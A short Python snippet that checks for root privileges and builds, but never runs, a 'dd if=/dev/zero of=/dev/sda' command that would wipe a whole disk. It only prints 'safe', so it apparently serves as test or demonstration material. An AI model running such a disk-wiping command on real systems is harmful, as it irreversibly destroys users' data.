import os, subprocess
if os.geteuid() == 0:
    argv = ['dd','if=/dev/zero','of=/dev/sda']
    subprocess.run(['echo','safe'])
